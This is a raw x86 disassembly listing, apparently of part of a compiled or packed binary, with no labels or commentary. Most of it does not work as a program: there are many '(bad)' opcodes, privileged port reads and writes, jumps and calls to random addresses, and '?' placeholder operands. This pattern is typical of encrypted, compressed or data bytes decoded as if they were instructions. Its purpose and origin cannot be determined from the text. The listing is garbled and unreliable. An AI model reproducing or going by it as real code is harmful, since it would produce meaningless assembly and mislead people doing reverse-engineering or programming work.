  414fb4:	in     al,dx
  414fb5:	enter  0xd12f,0xb0
  414fb9:	sbb    eax,0x746f52a9
  414fbe:	pop    ss
  414fbf:	xchg   edx,eax
  414fc0:	lods   al,BYTE PTR ds:[esi]
  414fc1:	loopne 0x414fa2
  414fc3:	ror    bh,1
  414fc5:	in     al,0x6d
  414fc7:	imul   eax,eax,0xcab71dc9
  414fcd:	or     esi,edi
  414fcf:	inc    edi
  414fd0:	mov    BYTE PTR [ebx-0x1a53530],bh
  414fd6:	out    dx,al
  414fd7:	xchg   ecx,eax
  414fd8:	xor    esi,edx
  414fda:	add    DWORD PTR es:[edx-0x7f],ecx
  414fde:	push   edi
  414fdf:	out    0x9e,al
  414fe1:	addr16 in al,0x7f
  414fe4:	in     eax,0x42
  414fe6:	lods   al,BYTE PTR ds:[esi]
  414fe7:	scas   eax,DWORD PTR es:[edi]
  414fe8:	cwde   
  414fe9:	adc    esp,esi
  414feb:	rcl    edi,cl
  414fed:	js     0x414fb0
  414fef:	adc    ebx,DWORD PTR [ecx+0x73]
  414ff2:	push   ecx
  414ff3:	mov    WORD PTR [ebx-0x6b],ds
  414ff6:	jg     0x41503d
  414ff8:	sbb    bh,dl
  414ffa:	pop    ebp
  414ffb:	das    
  414ffc:	fmulp  st(3),st
  414ffe:	mov    al,0x3f
  415000:	cdq    
  415001:	or     DWORD PTR [esi+0x29],edx
  415004:	loope  0x414fc4
  415006:	dec    edi
  415007:	pop    esi
  415008:	sbb    DWORD PTR [ecx+ebx*8-0x78],ecx
  41500c:	adc    BYTE PTR [ebx+0x43],bl
  41500f:	popa   
  415010:	cmp    DWORD PTR [eax],eax
  415012:	(bad)  
  415013:	mov    ch,0x27
  415015:	sbb    ah,ch
  415017:	cli    
  415018:	inc    esp
  415019:	bound  ebx,QWORD PTR ss:[eax+0x65]
  41501d:	sbb    al,BYTE PTR [edi+edi*8+0x2d728fc1]
  415024:	dec    esp
  415025:	cmc    
  415026:	fimul  WORD PTR [edx-0x22]
  415029:	cmp    eax,0x5aca3a83
  41502e:	dec    ebx
  41502f:	adc    dl,ch
  415031:	cmp    al,0x36
  415033:	retf   
  415034:	or     BYTE PTR [edx+0x50c76b7c],bl
  41503a:	js     0x414fff
  41503c:	daa    
  41503d:	aam    0x7
  41503f:	xor    DWORD PTR [ebp+0x1521cecd],0x15
  415046:	push   ds
  415047:	sub    ecx,DWORD PTR [eax+ecx*2+0x34]
  41504b:	fsub   DWORD PTR [edx-0x3c6c1b10]
  415051:	add    al,0xad
  415053:	loopne 0x415005
  415055:	sub    al,0xda
  415057:	je     0x41501f
  415059:	dec    ebx
  41505a:	inc    ebp
  41505b:	and    DWORD PTR [eax+0x54],esp
  41505e:	and    eax,0x5b4340aa
  415063:	jae    0x4150bd
  415065:	mov    ?,edx
  415067:	les    edi,FWORD PTR [ebx]
  415069:	sbb    eax,0xf8598175
  41506e:	imul   ecx,DWORD PTR [ebx],0x164f927f
  415074:	sub    al,0x46
  415076:	sti    
  415077:	fsubr  QWORD PTR [edx]
  415079:	ret    
  41507a:	(bad)  
  41507b:	(bad)  
  41507c:	daa    
  41507d:	outs   dx,BYTE PTR ds:[esi]
  41507e:	inc    edx
  41507f:	adc    DWORD PTR [ebx+ebp*1+0x6cffeb82],edi
  415086:	or     BYTE PTR [ebp+0x2db1e7ee],0xfa
  41508d:	mov    ah,0x58
  41508f:	jns    0x4150bf
  415091:	pop    edi
  415092:	xchg   ebx,eax
  415093:	push   esi
  415094:	bound  edx,QWORD PTR [edx-0x6c10b782]
  41509a:	mov    eax,0xaee2da7a
  41509f:	pop    esp
  4150a0:	in     al,dx
  4150a1:	loope  0x4150b1
  4150a3:	mov    ds:0xe282d121,al
  4150a8:	into   
  4150a9:	adc    DWORD PTR [ebx+0x52],esp
  4150ac:	or     BYTE PTR [ebx-0x195925cc],cl
  4150b2:	ins    DWORD PTR es:[edi],dx
  4150b3:	push   ecx
  4150b4:	js     0x4150bd
  4150b6:	mov    cl,0xf0
  4150b8:	pop    edi
  4150b9:	pop    esi
  4150ba:	ds sub bh,0x74
  4150be:	fwait
  4150bf:	lea    esp,[ebx-0x5c4ae2cc]
  4150c5:	aam    0xe8
  4150c7:	(bad)  
  4150c8:	imul   edx,DWORD PTR [ecx-0x36d61378],0x920c8ae9
  4150d2:	push   ds
  4150d3:	(bad)  
  4150d5:	add    BYTE PTR [esi-0x44f9884c],ch
  4150db:	ds push 0xffffffd6
  4150de:	cwde   
  4150df:	and    DWORD PTR [ebp+eax*4+0x6b],ebx
  4150e3:	xchg   ebp,eax
  4150e4:	dec    esi
  4150e5:	xchg   DWORD PTR [edx+0x1f388284],edx
  4150eb:	inc    ecx
  4150ec:	std    
  4150ed:	mov    ebp,0x78909387
  4150f2:	call   0x43e5219a
  4150f7:	popa   
  4150f8:	xchg   esi,eax
  4150f9:	sub    ch,BYTE PTR [ebx-0x3a9f7e0f]
  4150ff:	add    eax,0x879da394
  415104:	addr16 mov esp,ecx
  415107:	data16 jno 0x415107
  41510a:	mov    cl,0x4
  41510c:	fdivr  QWORD PTR [edi-0x6ddbc00c]
  415112:	or     al,0x31
  415114:	mov    ebp,0xd9a86178
  415119:	jae    0x415108
  41511b:	aaa    
  41511c:	gs out 0x6,eax
  41511f:	or     al,0xbe
  415121:	pop    ecx
  415122:	fstp   QWORD PTR [ecx+eiz*8]
  415125:	mov    ebp,fs
  415127:	jo     0x415109
  415129:	or     eax,0xb3ed7314
  41512e:	(bad)  
  41512f:	sar    DWORD PTR [edi+ecx*1],0x95
  415133:	mov    WORD PTR [edx+0x746791a],?
  415139:	in     al,dx
  41513a:	sbb    DWORD PTR [ebx-0x4f],ebx
  41513d:	pop    ebp
  41513e:	in     eax,0x96
  415140:	jecxz  0x415155
  415142:	loopne 0x4151ba
  415144:	mov    esp,0x7a2300d9
  415149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41514a:	xchg   ebx,eax
  41514b:	pop    esi
  41514c:	adc    DWORD PTR [ebp+0x7d],ecx
  41514f:	aam    0xe7
  415151:	shl    DWORD PTR [eax+eiz*8-0x55],1
  415155:	arpl   di,sp
  415157:	shl    esp,1
  415159:	shr    ah,cl
  41515b:	xor    BYTE PTR [ecx-0x75c19b94],cl
  415161:	add    bh,0xe9
  415164:	or     BYTE PTR [ebp-0x11658c19],al
  41516a:	inc    edi
  41516b:	fistp  WORD PTR [ecx+eax*4-0x16]
  41516f:	xchg   edi,eax
  415170:	leave  
  415171:	xchg   esp,eax
  415172:	js     0x4151a4
  415174:	int    0xb7
  415176:	daa    
  415177:	popf   
  415178:	xchg   edx,eax
  415179:	scas   eax,DWORD PTR es:[edi]
  41517a:	loope  0x4151a8
  41517c:	inc    DWORD PTR [ebx]
  41517e:	nop
  41517f:	jns    0x415147
  415181:	pushf  
  415182:	ret    0x6643
  415185:	js     0x41511d
  415187:	out    dx,eax
  415188:	xor    eax,0x2a7eae2c
  41518d:	cld    
  41518e:	lods   eax,DWORD PTR ds:[esi]
  41518f:	fwait
  415190:	push   0x54bfc0ce
  415195:	imul   edx,DWORD PTR [esp+ebp*4-0x50b1bcb],0x8f94e54f
  4151a0:	sbb    BYTE PTR [esi-0x77],ah
  4151a3:	clc    
  4151a4:	das    
  4151a5:	sbb    dl,cl
  4151a7:	pop    esp
  4151a8:	iret   
  4151a9:	dec    ebp
  4151aa:	dec    edi
  4151ab:	mov    ch,BYTE PTR [edi+0x49]
  4151ae:	mov    al,0x9d
  4151b0:	and    al,0x87
  4151b2:	fistp  DWORD PTR [ecx+0x22]
  4151b5:	mov    dh,0x81
  4151b7:	xor    eax,0x22e86d46
  4151bc:	es mov ch,0x3
  4151bf:	loope  0x4151bd
  4151c1:	les    ebx,FWORD PTR gs:[ecx+0x6a44bb1e]
  4151c8:	call   0x707c:0xe6cb7b7a
  4151cf:	outs   dx,BYTE PTR ds:[esi]
  4151d0:	cmc    
  4151d1:	push   ss
  4151d2:	retf   0xf1d6
  4151d5:	cli    
  4151d6:	or     al,0x76
  4151d8:	or     eax,0x6565be81
  4151dd:	xchg   esp,eax
  4151de:	sbb    bh,bl
  4151e0:	inc    ebx
  4151e1:	cs or  al,0xe0
  4151e4:	or     ecx,ebx
  4151e6:	sub    al,0xdc
  4151e8:	jne    0x415173
  4151ea:	fidivr DWORD PTR [ebp+0x2d3a99e4]
  4151f0:	or     al,0xb5
  4151f2:	xchg   ebp,eax
  4151f3:	lock or di,WORD PTR [edi-0x53]
  4151f8:	cmp    DWORD PTR [edx+0x408e7b2d],eax
  4151fe:	jp     0x4151cf
  415200:	mov    DWORD PTR [ebx+0x73],edx
  415203:	imul   edi,DWORD PTR [edi+0x541a58bf],0xffffffc5
  41520a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41520b:	bound  ebx,QWORD PTR [eax+0x3c190e7e]
  415211:	xor    ah,bl
  415213:	or     eax,0x89163948
  415218:	dec    ebp
  415219:	xchg   DWORD PTR [edi],esp
  41521b:	cwde   
  41521c:	push   ss
  41521d:	mov    ecx,DWORD PTR [edx]
  41521f:	jg     0x415294
  415221:	dec    edi
  415222:	fld    QWORD PTR [eax]
  415224:	ins    BYTE PTR es:[di],dx
  415226:	fnstsw WORD PTR [edi+eax*2]
  415229:	adc    al,0x84
  41522b:	icebp  
  41522c:	fld    QWORD PTR [edi+edi*8-0x66fcdfdf]
  415233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415234:	inc    esp
  415235:	add    ch,0xbc
  415238:	ret    0xe31a
  41523b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41523c:	push   0x8d8cdecf
  415241:	lahf   
  415242:	retf   0xa9c
  415245:	scas   al,BYTE PTR es:[edi]
  415246:	sub    al,0xc7
  415248:	jecxz  0x4151fe
  41524a:	mov    esi,0x354867c4
  41524f:	in     eax,dx
  415250:	and    ebx,edi
  415252:	(bad)  
  415253:	push   esp
  415254:	imul   eax,DWORD PTR [esi],0xffffffb2
  415257:	(bad)  
  415258:	cld    
  415259:	dec    ecx
  41525a:	jmp    0xc93d9417
  41525f:	sbb    eax,0x9184208d
  415264:	xchg   BYTE PTR gs:[ebp+edx*4-0x55],dh
  415269:	scas   al,BYTE PTR es:[edi]
  41526a:	mov    eax,esi
  41526c:	mov    esp,0x4a88925a
  415271:	or     cl,BYTE PTR [ecx+0x6d]
  415274:	push   es
  415275:	outs   dx,BYTE PTR ds:[esi]
  415276:	sbb    ch,BYTE PTR [esi+ebp*8+0x618fe7e7]
  41527d:	jle    0x4152c3
  41527f:	cmp    BYTE PTR [edi-0x3e8ac7e7],ch
  415285:	arpl   WORD PTR [edi-0x2b9c7703],dx
  41528b:	mov    WORD PTR [esi],ss
  41528d:	fst    st(0)
  41528f:	lods   al,BYTE PTR ds:[esi]
  415290:	mov    edi,0x5c6a3699
  415295:	adc    eax,0x9a0b63bb
  41529a:	push   eax
  41529b:	push   eax
  41529c:	xchg   esi,eax
  41529d:	mov    eax,0x3f6f7b8a
  4152a2:	xchg   esi,eax
  4152a3:	adc    eax,0xf570bb14
  4152a8:	push   edi
  4152a9:	ja     0x4152ad
  4152ab:	jnp    0x41522d
  4152ad:	sar    bl,cl
  4152af:	inc    edx
  4152b0:	ret    
  4152b1:	and    eax,0x3b5a9f59
  4152b6:	cs add al,0x2f
  4152b9:	mov    DWORD PTR [edi+eax*8-0x3d],0x9889b32a
  4152c1:	push   edi
  4152c2:	xor    BYTE PTR [esi-0x3a],ah
  4152c5:	fcomp  DWORD PTR [esi]
  4152c7:	mov    cl,0xbe
  4152c9:	mov    edx,0x99d382fb
  4152ce:	xlat   BYTE PTR ds:[ebx]
  4152cf:	cmp    cl,BYTE PTR [ecx]
  4152d1:	xchg   BYTE PTR ds:0x9f1f44a,bl
  4152d7:	dec    ebp
  4152d8:	mov    BYTE PTR [edi],cl
  4152da:	pop    ebx
  4152db:	ins    DWORD PTR es:[edi],dx
  4152dc:	cmc    
  4152dd:	(bad)  
  4152de:	lea    ebp,[eax-0x2c]
  4152e1:	ret    
  4152e2:	xor    BYTE PTR [ecx],dl
  4152e4:	add    al,0x56
  4152e6:	jge    0x41529d
  4152e8:	es dec esp
  4152ea:	adc    dh,BYTE PTR [edx-0x13219606]
  4152f0:	adc    eax,DWORD PTR [edi+0x34207f]
  4152f6:	sbb    eax,0x6233ade6
  4152fb:	dec    ecx
  4152fc:	sub    ah,ch
  4152fe:	sub    al,0x81
  415300:	and    al,0xd5
  415302:	xor    DWORD PTR [ecx],0x26
  415305:	add    eax,0x58baeed6
  41530a:	nop
  41530b:	shr    DWORD PTR [edi],1
  41530d:	aam    0x55
  41530f:	fdivr  DWORD PTR ss:[esi]
  415312:	cld    
  415313:	dec    ecx
  415314:	pop    ebp
  415315:	in     eax,dx
  415316:	lds    eax,FWORD PTR [ecx+0x62ba1d98]
  41531c:	cmp    BYTE PTR [edx],dh
  41531e:	addr16 mov dh,0x8d
  415321:	(bad)  
  415323:	addr16 inc ebx
  415325:	xlat   BYTE PTR ds:[ebx]
  415326:	and    bh,BYTE PTR [esi]
  415328:	adc    eax,0x51fceb04
  41532d:	jae    0x415354
  41532f:	adc    ebp,eax
  415331:	out    dx,eax
  415332:	mov    ebx,0x1c0a2530
  415337:	mov    gs,esi
  415339:	add    cl,ah
  41533b:	sar    BYTE PTR [ebx],cl
  41533d:	mov    BYTE PTR [edi+0x61a37918],bl
  415343:	and    eax,0xb8ec938
  415348:	adc    al,0x9c
  41534a:	mov    bh,0xc8
  41534c:	imul   esp,DWORD PTR [ebp+0x1c],0xffffffcc
  415350:	xor    al,0x79
  415352:	or     bh,bl
  415354:	icebp  
  415355:	lods   eax,DWORD PTR ds:[esi]
  415356:	lods   al,BYTE PTR ds:[esi]
  415357:	aam    0x4e
  415359:	in     al,dx
  41535a:	or     DWORD PTR [eax-0xa],ebp
  41535d:	icebp  
  41535e:	or     esi,edx
  415360:	jmp    0x415327
  415362:	adc    eax,0xd41ea443
  415367:	inc    ebp
  415368:	call   0x93d1f4b2
  41536d:	adc    ch,bl
  41536f:	jmp    0x4153b6
  415371:	data16 into 
  415373:	pop    ebp
  415374:	adc    DWORD PTR [ebp+0x64],eax
  415377:	or     cl,0xff
  41537a:	(bad)  [ebp-0x5a]
  41537d:	cdq    
  41537e:	mov    ebx,0xb0994465
  415383:	(bad)  
  415384:	enter  0x5937,0xc9
  415388:	(bad)  
  415389:	shl    DWORD PTR [ebx+0x72],1
  41538c:	sbb    esp,edx
  41538e:	ja     0x4153a3
  415390:	cld    
  415391:	xchg   edx,eax
  415392:	mov    al,ds:0x4bf1250d
  415397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415398:	loop   0x415398
  41539a:	cmp    al,0xe6
  41539c:	sar    dl,cl
  41539e:	inc    esi
  41539f:	or     BYTE PTR [edi+0x53],cl
  4153a2:	call   0xa35b4e5
  4153a7:	push   0xe456ca01
  4153ac:	mov    ds:0xa40f05c2,al
  4153b1:	xchg   DWORD PTR ds:0xc11896e0,esp
  4153b7:	pop    eax
  4153b8:	pushf  
  4153b9:	pushf  
  4153ba:	sar    al,1
  4153bc:	(bad)  
  4153bd:	(bad)  
  4153be:	idiv   DWORD PTR [ecx-0x6095ac73]
  4153c4:	std    
  4153c5:	les    edx,FWORD PTR [esi]
  4153c7:	sub    DWORD PTR [ecx+0x267060e3],0x282daf68
  4153d1:	cmp    al,0x23
  4153d3:	push   cs
  4153d4:	push   ebp
  4153d5:	pop    ecx
  4153d6:	cli    
  4153d7:	and    BYTE PTR [ecx-0x72a41cde],bl
  4153dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153de:	or     al,0x81
  4153e0:	lods   al,BYTE PTR ds:[esi]
  4153e1:	iret   
  4153e2:	mov    bh,0x95
  4153e4:	stos   DWORD PTR es:[edi],eax
  4153e5:	jo     0x4153e0
  4153e7:	xor    al,0xf3
  4153e9:	out    0xa6,al
  4153eb:	cld    
  4153ec:	bound  ebx,QWORD PTR [eax-0x1af32717]
  4153f2:	les    ecx,FWORD PTR [edi-0x73]
  4153f5:	(bad)  
  4153f6:	pop    eax
  4153f7:	jp     0x415468
  4153f9:	lahf   
  4153fa:	or     ebx,DWORD PTR [esi+0x6c281563]
  415400:	rcr    DWORD PTR [esi-0x40],0x6f
  415404:	(bad)  
  415405:	(bad)  
  415407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415408:	push   ecx
  415409:	jp     0x415432
  41540b:	sub    al,0x67
  41540d:	push   esp
  41540e:	sub    ah,BYTE PTR [eax]
  415410:	cmp    ebp,edi
  415412:	dec    edx
  415413:	bound  ebx,QWORD PTR [edi]
  415415:	sbb    al,0xd3
  415417:	jne    0x415495
  415419:	sbb    DWORD PTR ds:0xe9f3b0c5,0x5650944d
  415423:	mov    ah,0xe8
  415425:	push   edi
  415426:	jb     0x41543e
  415428:	jb     0x4153b8
  41542a:	sub    BYTE PTR [ebx+0x2c6e0c40],ah
  415430:	aaa    
  415431:	mov    dl,0x27
  415433:	push   edi
  415434:	add    al,0x19
  415436:	add    dl,BYTE PTR [edx]
  415438:	pop    es
  415439:	mov    ch,0x58
  41543b:	and    BYTE PTR [esi-0x27],bh
  41543e:	sub    eax,esi
  415440:	jl     0x4153f0
  415442:	mov    eax,ds:0xe268bfa2
  415447:	pop    ss
  415448:	outs   dx,DWORD PTR ds:[esi]
  415449:	stc    
  41544a:	cmp    eax,0x2845779
  41544f:	daa    
  415450:	outs   dx,BYTE PTR ds:[esi]
  415451:	jb     0x41540c
  415453:	mov    bh,0xfd
  415455:	sbb    esp,DWORD PTR [edi]
  415457:	fistp  QWORD PTR [edx+0x27]
  41545a:	jo     0x4154d3
  41545c:	jne    0x4154b7
  41545e:	(bad)  
  41545f:	sbb    DWORD PTR [ebp+0xd771684],ebx
  415465:	jge    0x4154aa
  415467:	das    
  415468:	in     al,0x76
  41546a:	inc    ebp
  41546b:	cmp    bl,bl
  41546d:	jmp    0xdf95:0xa3c7976f
  415474:	and    ebx,edi
  415476:	aad    0xec
  415478:	and    eax,0x66e5e0af
  41547d:	dec    ecx
  41547e:	cld    
  41547f:	hlt    
  415480:	je     0x415478
  415482:	mov    eax,0x9b9c5f0e
  415487:	shr    DWORD PTR [eax],cl
  415489:	jmp    0x4154a2
  41548b:	pop    ebx
  41548c:	test   DWORD PTR [esp+eiz*8+0x50282b10],edx
  415493:	popf   
  415494:	sub    eax,0x17470448
  415499:	cmp    dh,BYTE PTR [edx]
  41549b:	push   0xffffffab
  41549d:	imul   eax,ebx,0xaee936d
  4154a3:	or     al,bh
  4154a5:	xchg   dh,bh
  4154a7:	rcl    BYTE PTR [esi-0x39b0781d],cl
  4154ad:	jno    0x41543c
  4154af:	push   esp
  4154b0:	div    DWORD PTR [edi+0x7d]
  4154b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154b4:	lock lea ebp,[esi+0x5239352]
  4154bb:	mov    DWORD PTR [ecx+0x12],esp
  4154be:	pop    edx
  4154bf:	inc    eax
  4154c0:	xchg   ecx,eax
  4154c1:	add    ecx,edi
  4154c3:	pop    ecx
  4154c4:	inc    esp
  4154c5:	lock lods eax,DWORD PTR ds:[esi]
  4154c7:	sub    BYTE PTR [ebp+0x23735510],bl
  4154cd:	loop   0x415458
  4154cf:	in     al,dx
  4154d0:	ins    BYTE PTR es:[edi],dx
  4154d1:	pop    ebp
  4154d2:	ins    BYTE PTR es:[edi],dx
  4154d3:	jecxz  0x415550
  4154d5:	sub    ch,BYTE PTR [ecx]
  4154d7:	lahf   
  4154d8:	or     eax,0x171a6982
  4154dd:	push   es
  4154de:	fistp  QWORD PTR [ebx*1-0x65191131]
  4154e5:	push   ebx
  4154e6:	leave  
  4154e7:	or     DWORD PTR ds:0x64b660a7,esp
  4154ed:	mov    ds:0x1afe9c04,eax
  4154f2:	int    0xa7
  4154f4:	stos   DWORD PTR es:[edi],eax
  4154f5:	sub    dh,BYTE PTR [eax]
  4154f7:	cs push ss
  4154f9:	mov    bl,0x92
  4154fb:	rep outs dx,BYTE PTR ds:[esi]
  4154fd:	xchg   esi,eax
  4154fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154ff:	and    al,0x6e
  415501:	push   cs
  415502:	lock jbe 0x415549
  415505:	fsubr  DWORD PTR [ebp-0xe]
  415508:	into   
  415509:	sahf   
  41550a:	push   esi
  41550b:	mov    edx,DWORD PTR [eax+0x6b]
  41550e:	ja     0x415588
  415510:	cmp    BYTE PTR [edx-0x13c9ba16],dl
  415516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415517:	mov    dl,0x4d
  415519:	push   ebx
  41551a:	add    al,0x83
  41551c:	ror    BYTE PTR [eax+0x22],cl
  41551f:	retf   0xc3db
  415522:	aam    0xe4
  415524:	push   es
  415525:	and    DWORD PTR [edi+edx*8+0x4e93af2a],eax
  41552c:	xchg   DWORD PTR [ebp+0x660d645f],esp
  415532:	sbb    al,0xfa
  415534:	out    0x43,eax
  415536:	push   cs
  415537:	inc    edx
  415538:	mov    edx,0xf63fb167
  41553d:	fs mov eax,0xef976b6d
  415543:	adc    BYTE PTR [ebp+0xab6d5ca],0x7a
  41554a:	sbb    BYTE PTR [ecx+0x38],dh
  41554d:	dec    edi
  41554e:	cdq    
  41554f:	dec    ebp
  415550:	jp     0x4155c7
  415552:	inc    ebp
  415553:	test   al,0xba
  415555:	cmp    BYTE PTR [esi-0x2f],0x5d
  415559:	mov    esp,0xb690cead
  41555e:	or     esi,ecx
  415560:	fsubr  st(4),st
  415562:	sti    
  415563:	inc    ebx
  415564:	out    dx,eax
  415565:	or     eax,0xf7a8f696
  41556a:	rol    DWORD PTR ds:0x132cb5e1,0xc
  415571:	imul   esi,DWORD PTR [eax],0x5b6d3f3c
  415577:	add    dh,BYTE PTR [edi]
  415579:	mov    ds:0x79949360,al
  41557e:	or     eax,0x79942ff7
  415583:	sub    cl,dh
  415585:	(bad)  
  415586:	(bad)  
  415588:	push   edi
  415589:	fld    DWORD PTR [eax-0x1a]
  41558c:	xor    ch,bl
  41558e:	mov    al,ds:0x7d820cd1
  415593:	mov    edi,0x6e99d506
  415598:	cwde   
  415599:	je     0x41556a
  41559b:	mov    al,ds:0x5573167d
  4155a0:	jae    0x4155a5
  4155a2:	(bad)  [edx-0x7d]
  4155a5:	sbb    al,0xbe
  4155a7:	sub    edi,DWORD PTR [esp+ebp*8]
  4155aa:	push   ds
  4155ab:	pop    ss
  4155ac:	adc    al,bh
  4155ae:	fucom  st(3)
  4155b0:	pop    edx
  4155b1:	rol    cl,1
  4155b3:	xchg   cl,bh
  4155b5:	fsubr  QWORD PTR [ebp+0x56591032]
  4155bb:	popa   
  4155bc:	bound  edx,QWORD PTR [ecx-0x2aeff5fd]
  4155c2:	jle    0x415619
  4155c4:	mov    WORD PTR [ecx+esi*1-0x52],?
  4155c8:	into   
  4155c9:	aaa    
  4155ca:	mov    ebp,0xe3e119fa
  4155cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155d0:	xor    BYTE PTR ds:0xc34c1018,0x1f
  4155d7:	into   
  4155d8:	(bad)  
  4155d9:	in     eax,dx
  4155da:	inc    esp
  4155db:	push   esi
  4155dc:	fisub  WORD PTR [eax+0x14]
  4155df:	shl    BYTE PTR [ebx-0x173e0e85],cl
  4155e5:	mov    ch,0xbd
  4155e7:	pushf  
  4155e8:	push   edx
  4155e9:	xchg   DWORD PTR [esp+edx*2-0x3],esi
  4155ed:	jnp    0x4155cc
  4155ef:	push   cs
  4155f0:	fucomi st,st(7)
  4155f2:	sub    al,0x84
  4155f4:	fdivr  DWORD PTR [ecx+0x79d4365e]
  4155fa:	adc    eax,0x1c27ffe9
  4155ff:	mov    esi,0xde621b7b
  415604:	adc    esi,DWORD PTR [ecx-0xa]
  415607:	arpl   WORD PTR [edi+ebp*4],di
  41560a:	test   al,0x69
  41560c:	bound  edx,QWORD PTR [edi+0x78]
  41560f:	push   esp
  415610:	aad    0x43
  415612:	(bad)  
  415614:	fs test eax,0x54722efe
  41561a:	ds imul esi
  41561d:	push   edi
  41561e:	pusha  
  41561f:	fadd   QWORD PTR [ecx]
  415621:	div    DWORD PTR [esi+ecx*4]
  415624:	enter  0x5fbf,0x7e
  415628:	jle    0x4155bf
  41562a:	push   0xddbad6c2
  41562f:	clc    
  415630:	loop   0x415636
  415632:	scas   al,BYTE PTR es:[edi]
  415633:	test   eax,0x3b58ee1b
  415638:	frstor [ecx+0x349a98da]
  41563e:	(bad)  
  41563f:	lds    edx,FWORD PTR [esi]
  415641:	std    
  415642:	mov    ch,0xa9
  415644:	adc    bl,cl
  415646:	cmp    bl,0xc5
  415649:	xchg   edi,eax
  41564a:	xor    BYTE PTR [eax],dl
  41564c:	mov    eax,0xe3ba80fb
  415651:	aaa    
  415652:	cld    
  415653:	pop    ecx
  415654:	cli    
  415655:	xchg   edi,eax
  415656:	rol    BYTE PTR [edx+0x14],1
  415659:	inc    BYTE PTR [edi+0x1a8e8aa6]
  41565f:	mov    ecx,0x63b2517d
  415664:	stc    
  415665:	jecxz  0x4155f2
  415667:	or     al,0xfa
  415669:	daa    
  41566a:	or     eax,0x1ad8449c
  41566f:	mov    al,ds:0x25173f3a
  415674:	aaa    
  415675:	in     al,dx
  415676:	sub    ebp,0x5d489c03
  41567c:	adc    bl,BYTE PTR [ebx+0x7d]
  41567f:	imul   BYTE PTR [edi+0x75]
  415682:	lods   eax,DWORD PTR ds:[esi]
  415683:	mov    cl,0x65
  415685:	mov    cl,0x18
  415687:	or     dh,BYTE PTR ds:0x4279f34c
  41568d:	addr16 jg 0x41570d
  415690:	xor    eax,0xd8439089
  415695:	scas   al,BYTE PTR es:[edi]
  415696:	sar    esi,0xcf
  415699:	fld    DWORD PTR [edi+0x28]
  41569c:	inc    esp
  41569d:	mov    eax,0xeb3de6a6
  4156a2:	mov    DWORD PTR [eax+edx*8+0x62],edi
  4156a6:	pop    eax
  4156a7:	shr    DWORD PTR [ecx-0x3ad49064],cl
  4156ad:	mov    esi,0x56d09ac2
  4156b2:	lea    ebx,ds:0x2eaf9005
  4156b8:	inc    ebx
  4156b9:	call   0xf0ef:0x64ede5be
  4156c0:	cmp    dl,BYTE PTR [edi+0x34]
  4156c3:	icebp  
  4156c4:	sub    dl,BYTE PTR [edx+ebp*1+0x73585114]
  4156cb:	sbb    al,0x99
  4156cd:	xchg   ebx,eax
  4156ce:	xchg   ebx,eax
  4156cf:	pop    ss
  4156d0:	retf   
  4156d1:	in     al,dx
  4156d2:	jmp    0xab6a0e77
  4156d7:	xchg   edx,eax
  4156d8:	sbb    ecx,DWORD PTR [ebx]
  4156da:	scas   al,BYTE PTR es:[edi]
  4156db:	ins    DWORD PTR es:[edi],dx
  4156dc:	es jle 0x415756
  4156df:	daa    
  4156e0:	jl     0x41570b
  4156e2:	push   ecx
  4156e3:	sbb    cl,BYTE PTR [esi]
  4156e5:	dec    ebx
  4156e6:	lahf   
  4156e7:	fs hlt 
  4156e9:	int    0x26
  4156eb:	aad    0x7
  4156ed:	xchg   ebx,eax
  4156ee:	push   ebp
  4156ef:	adc    DWORD PTR [ebx+ebp*2],0x8ae8dd91
  4156f6:	jmp    0x415712
  4156f8:	lods   eax,DWORD PTR ds:[esi]
  4156f9:	hlt    
  4156fa:	mov    ebp,0x560c14b6
  4156ff:	mov    esi,0x797ece8c
  415704:	cld    
  415705:	mov    ebp,DWORD PTR [esi]
  415707:	jge    0x4156e4
  415709:	sbb    al,0x19
  41570b:	test   ah,ch
  41570d:	shl    DWORD PTR [ecx-0x4],0xf3
  415711:	neg    bh
  415713:	out    0xb4,al
  415715:	dec    edx
  415716:	jl     0x415729
  415718:	loop   0x41570a
  41571a:	xlat   BYTE PTR ds:[ebx]
  41571b:	adc    BYTE PTR [eax+0x20cbd4a4],bh
  415721:	jl     0x41572f
  415723:	mov    es,WORD PTR [edi+0x545ff2fb]
  415729:	jae    0x41573a
  41572b:	retf   0xb606
  41572e:	mov    BYTE PTR [ebx],bh
  415730:	in     al,0xb6
  415732:	inc    esi
  415733:	iret   
  415734:	cmp    DWORD PTR [esp+ebp*4-0x1],ebx
  415738:	mov    cl,0x25
  41573a:	xor    eax,0x57fab559
  41573f:	dec    ebp
  415740:	xchg   edi,eax
  415741:	mov    eax,ds:0x591c40df
  415746:	fisubr WORD PTR [ebp-0x39]
  415749:	mov    al,0xe6
  41574b:	xor    BYTE PTR [edx+0x17414ee2],dl
  415751:	mov    ds:0x9452fe57,eax
  415756:	mov    ds:0x81a5e4e3,eax
  41575b:	lock leave 
  41575d:	mov    edx,0xd2598204
  415762:	imul   ecx,DWORD PTR [ecx+0x2b],0xffffff99
  415766:	push   ss
  415767:	f2xm1  
  415769:	sbb    al,0xde
  41576b:	or     DWORD PTR [ebx+eax*1-0x3fa303bd],esp
  415772:	or     eax,0x3d47c765
  415777:	(bad)  
  415778:	sbb    DWORD PTR [ebx-0x50a1c3ae],edi
  41577e:	hlt    
  41577f:	dec    ebp
  415780:	add    DWORD PTR [ecx+0x49c790be],edx
  415786:	push   esi
  415787:	xor    DWORD PTR [edi-0x78],edx
  41578a:	(bad)  
  41578b:	mov    esp,DWORD PTR [edx]
  41578d:	les    ebx,FWORD PTR [ebx+0x22]
  415790:	imul   ecx,DWORD PTR [eax],0xffffffdf
  415793:	bound  ebp,QWORD PTR [edi-0x55ccb342]
  415799:	or     DWORD PTR [esi-0x2ca62068],edx
  41579f:	lock jmp 0xf4c54fde
  4157a5:	xchg   esp,eax
  4157a6:	in     eax,0x9
  4157a8:	add    ch,ch
  4157aa:	xlat   BYTE PTR ds:[ebx]
  4157ab:	imul   eax,esp,0x79
